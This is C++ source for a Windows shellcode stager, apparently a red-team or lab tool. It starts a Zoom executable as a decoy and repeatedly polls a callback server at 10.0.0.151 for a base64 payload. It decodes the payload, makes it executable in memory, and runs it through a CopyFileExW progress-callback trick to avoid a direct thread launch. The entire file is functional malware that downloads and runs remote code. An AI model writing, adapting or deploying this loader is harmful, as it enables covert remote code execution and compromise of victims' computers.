#define CALLBACK_SERVER "10.0.0.151"
#define CALLBACK_PORT 80
#define CALLBACK_ENDPOINT "test"
#define ZOOMNAME "c:\\users\\S4R1N\\AppData\\Roaming\\Zoom\\bin\\ZoomClient.exe"
#define TIMEOUT 60
#include <windows.h>
#pragma comment(lib, "Wininet.lib")
#include <wininet.h>
#include <string>
#include <vector>
#include <stdio.h>
#include <algorithm>
std::string fetcher();
std::string reader(HANDLE hHTTPrequest);
wchar_t* convertCharArrayToLPCWSTR(const char* charArray);
std::string err(const char* err);
std::string cleaner(std::string input);
std::string Decode(const std::string& input, std::string& out);
int exec(std::string input);

int main() {

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ::ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ::ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    ::CreateProcessW(convertCharArrayToLPCWSTR(ZOOMNAME), NULL, NULL, NULL, TRUE, NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
    
    std::string test = fetcher();
    while (test.empty()) {
        
        test = fetcher();
        Sleep(60000);

    }

    return exec(test);

}


std::string fetcher() {

    DWORD timeout = TIMEOUT * 1000;

    ::InternetSetOptionW(NULL, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    HANDLE hInternet = ::InternetOpenW(L"Not a Stager", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HANDLE hConnection = ::InternetConnectW(hInternet, convertCharArrayToLPCWSTR(CALLBACK_SERVER), (DWORD)CALLBACK_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    LPCWSTR file = convertCharArrayToLPCWSTR(CALLBACK_ENDPOINT);
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION;

    HANDLE hHTTPrequest = ::HttpOpenRequestW(hConnection, L"GET", file, L"HTTP/1.1", NULL, NULL, flags, NULL);
    if (::HttpSendRequestW(hHTTPrequest, NULL, NULL, NULL, NULL))
        return reader(hHTTPrequest);
    else return "";

}

wchar_t* convertCharArrayToLPCWSTR(const char* charArray) {

    wchar_t* wString = new wchar_t[4096];
    ZeroMemory(wString, 4096 * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;

}

std::string reader(HANDLE hHTTPrequest) {

    std::string response;
    response.clear();


    char buff[2048];
    DWORD dwBytesRead = 0;
    ::ZeroMemory(buff, sizeof(buff));

    while (::InternetReadFile(hHTTPrequest, buff, sizeof(buff), &dwBytesRead) == TRUE && dwBytesRead != 0) {

        response.append(buff, dwBytesRead);
        if (dwBytesRead == 0)
            break;

    }

    if (!response.empty())
        return cleaner(response);

    return response;


}

std::string err(const char* err) {

    printf("Error: %s (%u)\n", err, ::GetLastError());
    return "";

}

std::string Decode(const std::string& input, std::string& out) {
    static constexpr unsigned char kDecodingTable[] = {
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
      52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
      64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
      15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
      64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
      41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
      64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
    };

    size_t in_len = input.size();
    if (in_len % 4 != 0) return "Input data size is not a multiple of 4";

    size_t out_len = in_len / 4 * 3;
    if (input[in_len - 1] == '=') out_len--;
    if (input[in_len - 2] == '=') out_len--;

    out.resize(out_len);

    for (size_t i = 0, j = 0; i < in_len;) {
        uint32_t a = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
        uint32_t b = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
        uint32_t c = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
        uint32_t d = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];

        uint32_t triple = (a << 3 * 6) + (b << 2 * 6) + (c << 1 * 6) + (d << 0 * 6);

        if (j < out_len) out[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < out_len) out[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < out_len) out[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return "";
}

std::string cleaner(std::string input) {


    std::string decoded;

    std::string encoded = input;
    encoded.erase(std::remove(encoded.begin(), encoded.end(), '\n'), encoded.end());

    if (!encoded.empty())
        Decode(encoded, decoded);

    return decoded;
}

int exec(std::string input) {

    std::vector<uint8_t> myVector(input.begin(), input.end());

    LPVOID address = ::VirtualAlloc(NULL, myVector.size(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memcpy(address, &myVector[0], myVector.size());

    DWORD dummy;
    ::VirtualProtect(address, myVector.size(), PAGE_EXECUTE_READ, &dummy);
    
    ::DeleteFileW(L"C:\\Temp\\backup.log");
    ::CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Temp\\backup.log", (LPPROGRESS_ROUTINE)address, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);

    return 0;
}

